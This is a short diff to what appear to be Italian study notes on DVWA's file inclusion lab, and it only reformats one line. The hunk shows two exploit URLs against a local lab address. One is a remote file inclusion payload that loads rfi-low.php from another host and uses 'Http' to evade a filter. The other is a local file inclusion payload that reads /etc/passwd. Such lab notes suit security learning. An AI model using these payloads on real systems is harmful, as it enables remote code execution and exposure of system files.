@@ -93,7 +93,8 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 Exploit:
 
-- RFI: `http://172.17.0.2/vulnerabilities/fi/?page=Http://172.17.0.3/rfi-low.php`, notare `Http` nell'URL della risorsa acceduta
+- RFI: `http://172.17.0.2/vulnerabilities/fi/?page=Http://172.17.0.3/rfi-low.php`  
+	notare `Http` nell'URL della risorsa acceduta
 
 - LFI: `http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd`
 
